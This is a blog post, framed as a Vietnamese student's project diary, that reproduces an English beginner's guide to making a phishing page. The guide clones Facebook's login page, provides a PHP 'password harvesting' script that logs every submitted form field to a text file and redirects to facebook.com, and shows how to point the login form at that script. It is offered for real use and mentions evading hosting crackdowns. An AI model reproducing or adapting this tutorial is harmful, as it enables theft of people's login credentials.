---
layout: post
title: Nhật ký đồ án
subtitle: paper, đồ án
cover-img: /assets/img/path.jpg
thumbnail-img: /assets/img/lala.png
share-img: /assets/img/path.jpg
tags: [paper]

---


<style TYPE="text/css">
code.has-jax {font: inherit; font-size: 100%; background: inherit; border: inherit;}
</style>
<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [['$','$'], ['\\(','\\)']],
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'] // removed 'code' entry
    }
});
MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i = 0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';
    }
});
</script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-AMS_HTML-full"></script>

----------------

### <span style="color: red"> Thứ 3, ngày 21-12-2021 </span>

#### <span style="color: blue"> Topic: Complete Guide to Creating and Hosting a Phishing Page for Beginners </span>

Hello there, Recently I have come across many guides about creating phishing pages. Although the principles behind each guide is similar, most of hosting solutions provided in the guide does not work anymore due to increase in the crackdown of phishing pages by the hosting companies. In this guide, I will go through every step necessary to create and host a phishing page of your choice. Enjoy ! 

##### `Step 1` : <span style="color: green"> Download the HTML index of the Target Webpage </span>

To start off, you need to obtain the HTML index of the page. There are various methods of doing this, there are even templates online for popular sites. In this tutorial, I am going to use the most basic way in order to be as noob-friendly as possible.

###### <span style="color: #cc0080"> Navigate to Your Webpage </span>

In this tutorial, I am going to phish Facebook

![Imgur](https://i.imgur.com/cDLgJBP.png)

###### <span style="color: #cc0080"> View the Source of the Webpage </span>

Depending on your browser, there may be different methods. Normally it is done by right clicking the site and clicking "View Source". I have done that on my browser and a windows should come out similar to this:

![Imgur](https://i.imgur.com/xlyX3xL.png) 

On the box to the right is the source of the website. Which leads on the next step:

###### <span style="color: #cc0080"> Downloading and Saving the Source Code </span>

Select the box, and copy-paste everything in the box to a txt document. Use notepad on windows, and a simple text editing program if you are not using windows. (Don't use programs like Word or Pages because it is really slow). After you have done that, click, "Save As" or whatever option that allows you to save that document. On Notepad it should look like this : 

![Imgur](https://i.imgur.com/xlyX3xL.png)

Change "Save as type" to All files and change the encoding to Unicode.

After that, name the document "index.html", obviously without the speech marks

![Imgur](https://i.imgur.com/2GPbCbg.png)

Congratulations ! You have finished the first step of the tutorial ! 

##### `Step 2` : <span style="color: green"> Creating a PHP file for Password Harvesting</span>

The PHP file is basically the tool that harvest the users password in this scenario. There are several ways you can create this PHP if you have some programming knowledges, but if you don't, just copy my examplar PHP.

```php
<?php
header('Location: facebook.com');
$handle = fopen("log.txt","a")
foreach($_POST as $variable => $value){
    fwrite($handle,$variable);
    fwrite($handle,"=");
    fwrite($handle,$value);
    fwrite($handle,"\r\n");
}
fwrite($handle, "\r\n\n\n\n");
fclose($handle);
exit;
?>
```
Same as above, save the PHP file as "All files" and as "post.php". Change the encoding to Unicode and you should

##### `Step 3` : <span style="color: green"> Modify the Page HTML File to Incorporate Your PHP File in it. </span>

Now, we need to incorporate our PHP file, to receive password that the users end.

###### <span style="color: #cc0080"> Find the Password-Sending Method </span>

First, you need to see how the website deals when the user submits a username-password.

For Facebook, all you need to do is to Ctrl-F and type "=action" in the field.

![Imgur](https://i.imgur.com/adIxmdR.png)

Now, you need to replace everthing in the underlined porion with "post.php", keep the speech marks. (just one set place).

Obviously, this method will be different for other websites. A goos method to find it is by using Inspect Elements tool in most modern browsers and clicking on the login button. Find something similar to the above method.

Please note: You will need to change this later when you actually host the website.






